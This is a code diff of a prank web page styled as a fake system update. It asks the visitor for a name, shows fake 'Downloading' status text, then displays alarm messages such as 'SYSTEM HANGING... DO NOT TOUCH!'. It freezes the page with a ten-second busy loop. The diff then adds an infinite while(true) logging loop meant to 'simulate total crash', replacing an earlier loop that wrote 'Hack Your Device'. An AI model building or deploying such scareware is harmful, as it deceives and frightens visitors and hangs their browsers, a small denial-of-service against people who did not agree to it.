@@ -12,9 +12,6 @@
             text-align: center;
             padding: 50px;
         }
-        .hidden {
-            display: none;
-        }
         .error {
             color: red;
             font-size: 24px;
@@ -23,8 +20,8 @@
     </style>
 </head>
 <body>
-    <h2>Initializing System Update...</h2>
-    <p id="status">Downloading Files...</p>
+    <h2>Enter lang</h2>
+    <p id="status">Downloading Secret...</p>
     
     <input type="text" id="username" placeholder="Enter your name" style="margin-top: 20px; padding: 5px; font-size: 16px;">
     <button onclick="startFakeUpdate()" style="padding: 5px 10px; font-size: 16px;">Submit</button>
@@ -66,24 +63,22 @@
                     document.getElementById('timer').innerText = countdown;
                     if (countdown <= 0) {
                         clearInterval(interval);
-                        document.body.innerHTML = '<h1 class="error">SYSTEM HANGING... DO NOT TOUCH!</h1>';
+                        document.body.innerHTML = '<h1 class="error">WAIT SA!</h1>';
                         
-                        // Simulate system hang by freezing UI
+                        // Simulate system freeze
                         let start = Date.now();
                         while (Date.now() - start < 10000) {
-                            // This loop will freeze the UI for 10 seconds
+                            // UI frozen for 10 seconds
                         }
                         
-                        document.body.innerHTML = '<h1 class="error">Byee!</h1>';
+                        document.body.innerHTML = '<h1 class="error">Bye!</h1>';
                         
-                        // JavaScript While Loop Addition
-                        let text = "";
+                        // Infinite while loop to simulate total crash
                         let i = 0;
-                        while (i < 500000000) {
-                            text += "<br>Hack Your Device " + i;
+                        while (true) {
+                            console.log("FUEWFHREWUIHUGWIHGUWGHRUIHGDJKFGWEIUREUIRYQWYYUDFJHFSKFDSGFYEG  E YTREWQURIQERIUWLFSDGFEFRJHSHFYETGWUFJHFGEYWTGWETFGWEIKG " + i);
                             i++;
                         }
-                        document.body.innerHTML += '<p>' + text + '</p>';
                     }
                 }, 1000);
             }, 16000);
